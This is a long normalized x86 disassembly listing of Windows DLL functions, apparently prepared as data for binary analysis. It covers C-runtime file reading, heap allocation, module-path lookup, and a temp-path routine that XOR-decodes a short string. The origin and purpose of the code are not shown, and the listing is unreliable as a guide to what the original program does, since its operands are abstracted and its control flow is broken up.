jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + esi + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_1005f1fb
mov ebx eax
pop ecx
mov [ ebp - 0x10 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
mov eax ebx
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_10049f3a
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_1005b670
mov [ eax ] 0xc
call sub_1003a6bb
mov [ eax ] 0x8
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
js r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_1005b670
mov [ eax ] 0x9
call sub_1003a6bb
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x0
mov [ ebx ] cl
mov ecx [ edi ]
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_1005bae3
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0xc ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp ecx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp ecx 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
add ebx 0x2
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
add ebx 0x2
add eax 0x2
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x10 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
add ecx 0x2
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0xc ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_1005b670
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_10049f3a
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_10049f3a
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
add ebx 0x2
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_10049f3a
add esp 0x10
inc ebx
mov [ ecx + esi + 0x5 ] dl
cmp eax 0x2
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_10037acb
push 0x5c
mov eax sub_10085aac
call sub_10047689
fldz
mov eax [ ebp + 0x8 ]
fld [ ebp + 0x20 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x18 ]
fcom st1
mov [ ebp - 0x68 ] eax
xor ebx ebx
mov edi ecx
mov [ ebp - 0x64 ] bl
fnstsw ax
fstp st1
test ah 0x5
jpe r-xdata
fld [ r--data ]
mov [ ebp - 0x58 ] ebx
fcom st1
fnstsw ax
test ah 0x41
jpo r-xdata
mov [ ebp - 0x64 ] 0x1
fchs
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
fstp st0
jmp r-xdata
fxch st1
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fcom st1
fnstsw ax
test ah 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x40 ] 0x7
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] ax
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000f103
add esp 0x14
xor esi esi
mov [ ebp - 0x5c ] eax
cmp eax ebx
jle r-xdata
fxch st1
fstp st1
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
call sub_10030ff0
movzx eax ax
add esp 0xc
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_10004190
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_1001f5e0
push [ ebp - 0x64 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp - 0x68 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x60 ]
call sub_100087ba
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_1006d830
mov eax [ ebp - 0x60 ]
call sub_100262c3
retn 0x20
lea eax [ edi + 0x8 ]
push eax
movzx eax [ ebp + esi - 0x38 ]
push ebx
push eax
call sub_10030ff0
movzx eax ax
add esp 0xc
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10004190
inc esi
cmp esi [ ebp - 0x5c ]
jl r-xdata
sub_10037c00
push ebp
mov ebp esp
push 0xffffffff
push sub_1008647b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_10029fc7
push 0x4
mov [ ebp - 0x4 ] 0x0
call sub_1002e3ac
mov edi eax
add esp 0x4
test edi edi
je r-xdata
xor edi edi
call sub_1003e875
mov [ edi ] eax
call sub_10004aa4
push 0x0
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_1000c927
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_10003c9c
jmp r-xdata
inc eax
mov [ ebx + 0x4 ] eax
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea edx [ esi + 0x1c ]
mov [ esi + 0x24 ] edx
mov [ esi + 0x38 ] edi
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea edx [ esi + 0x2c ]
mov [ esi + 0x34 ] edx
mov [ eax ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10037cf0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_100651be
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_1004ca30
push ebx
push 0x0
mov ecx esi
call sub_1004ca30
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_10030594
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_10045c60
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
add ecx ebx
push ecx
push eax
call sub_1007f580
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10037de0
push ebp
mov ebp esp
push ecx
mov ecx [ ecx + 0x8 ]
push esi
mov esi [ ebp + 0x8 ]
mov eax ecx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
mov ecx esi
call sub_1003e780
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10037e30
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10037e71
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10050657
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10037f12
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_100637b6
dec [ ebp + 0x18 ]
jne r-xdata
sub_10037f3d
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x6
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_10037fbc
push 0x38
mov eax sub_100852a6
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1006406d
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1000c882
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_1002be90
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_1003806a
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_10057921
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_10081452
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_1005f1fb
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_10081452
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10038125
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_1005b670
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_10048fd4
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_100381b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a11c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
lea ecx [ edi + 0x3b0 ]
mov [ ebp - 0x2d0 ] edi
mov [ ebp - 0x2cc ] eax
call sub_100058a0
lea eax [ ebp - 0x284 ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x17c ]
lea edx [ ebp - 0x284 ]
mov ecx eax
xor esi esi
mov ebx 0x104
sub edx ecx
test ebx ebx
jne r-xdata
mov cl [ edx + eax ]
test cl cl
je r-xdata
mov [ eax ] 0x0
test esi esi
jns r-xdata
dec eax
mov esi 0x8007007a
mov [ eax ] cl
inc eax
dec ebx
jne r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov eax 0x1
jmp r-xdata
lea ecx [ ebx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0x43
inc cl
mov [ ebp + eax - 0x2bc ] dl
movzx eax cl
cmp eax 0x13
jb r-xdata
mov [ ebp - 0x2a9 ] 0x0
mov eax 0x104
lea ecx [ ebp - 0x17c ]
lea esp [ esp ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
xor esi esi
cmp eax esi
je r-xdata
inc ecx
dec eax
jne r-xdata
mov eax 0x2
jmp r-xdata
mov ecx 0x104
sub ecx eax
lea eax [ ebp - 0x2bc ]
push eax
mov eax 0x104
sub eax ecx
lea ecx [ ebp + ecx - 0x17c ]
mov edx 0x7fffffff
call sub_100726c0
cmp eax esi
jge r-xdata
cmp [ ecx ] 0x0
je r-xdata
mov eax 0x2
jmp r-xdata
push 0x3039
lea ecx [ ebp - 0x17c ]
push ecx
mov ecx edi
mov [ ebp - 0x2c8 ] esi
call sub_1002f8e0
test eax eax
jne r-xdata
mov eax [ ebp - 0x2cc ]
mov ebx [ eax ]
mov eax [ eax + 0x4 ]
cmp ebx eax
je r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0x9c
call sub_10069020
xor edx edx
lea eax [ ebp - 0x74 ]
mov [ ebp - 0x2a0 ] dx
mov [ ebp - 0x28c ] 0x7
mov [ ebp - 0x290 ] esi
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov ecx edi
call sub_10056d20
test eax eax
jne r-xdata
mov edx [ ebx + 0x14 ]
cmp edx 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x74 ]
push eax
lea ecx [ ebp - 0x2a0 ]
call sub_10034100
lea edx [ ebp - 0x2a0 ]
mov ecx 0x6
mov [ ebp - 0x4 ] esi
call sub_10022b50
cmp [ ebp - 0x28c ] 0x8
jb r-xdata
mov eax [ edi + 0x3a0 ]
push 0x2
push esi
push esi
mov esi [ eax ]
add esi 0x20
call sub_100290e0
mov ecx [ edi + 0x3a0 ]
mov eax [ ecx ]
mov edx [ eax + 0x20 ]
mov ecx [ edx + 0x4 ]
test [ eax + ecx + 0x2c ] 0x6
jne r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0xde
call sub_10069020
xor eax eax
mov [ ebp - 0x2a0 ] ax
mov eax edx
mov [ ebp - 0x28c ] 0x7
mov [ ebp - 0x290 ] esi
lea edx [ eax + 0x2 ]
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0x2a0 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ r--data ]
mov ecx [ r--data ]
mov [ ebp - 0x2c4 ] eax
xor eax eax
mov [ ebp - 0x2c0 ] ecx
mov [ ebp - 0x2bc ] eax
mov [ ebp - 0x2b8 ] eax
mov [ ebp - 0x2b4 ] eax
mov eax [ eax + ecx + 0x58 ]
mov edx [ eax ]
mov edx [ edx + 0x28 ]
push 0x1
push 0x1
push 0x0
push 0x0
lea ecx [ ebp - 0x2c4 ]
push ecx
mov ecx eax
call edx
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x6c ]
push ecx
lea ecx [ ebp - 0x2a0 ]
call sub_10034100
lea edx [ ebp - 0x2a0 ]
mov ecx 0x6
mov [ ebp - 0x4 ] 0x3
call sub_10022b50
cmp [ ebp - 0x28c ] 0x8
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov ecx [ ebx + 0x10 ]
lea ecx [ eax + ecx * 2 ]
cmp edx 0x8
jb r-xdata
mov edx [ ebp - 0x2c4 ]
add edx [ ebp - 0x2bc ]
mov ecx [ edi + 0x3a0 ]
push 0x0
mov [ edi + 0x8 ] edx
mov esi [ ecx ]
push 0x0
push 0x0
add esi 0x20
call sub_100290e0
mov edx [ edi + 0x8 ]
push edx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx eax
mov eax [ edi + 0x8 ]
cdq
push edx
push eax
mov eax [ edi + 0x3a0 ]
push ecx
mov [ edi + 0x4 ] ecx
mov ecx [ eax ]
add ecx 0x20
push ecx
call sub_1006b5a0
mov eax [ ebp - 0x2c8 ]
mov eax 0x8
jmp r-xdata
mov edx [ ebp - 0x2a0 ]
push edx
call sub_1000a86e
add esp 0x4
mov esi [ ebp - 0x2d0 ]
call sub_10003460
test eax eax
jne r-xdata
lea edi [ ebp - 0x2a0 ]
mov edx [ ebp - 0x2c8 ]
push edx
push ecx
push eax
lea eax [ ebp - 0x2a0 ]
push eax
mov [ ebp - 0x28c ] 0xf
mov [ ebp - 0x290 ] esi
mov [ ebp - 0x2a0 ] 0x0
call sub_1004f5e0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x28c ] 0x10
mov edi [ ebp - 0x2a0 ]
jae r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x28c ] 0x10
jb r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x124
call sub_10069020
mov ecx edx
push ecx
lea edx [ ebp - 0x2c4 ]
push edx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0x6
mov [ ebp - 0x4 ] 0x2
call sub_10022b50
cmp [ ebp - 0x2b0 ] 0x8
jb r-xdata
mov edx [ ebp - 0x2cc ]
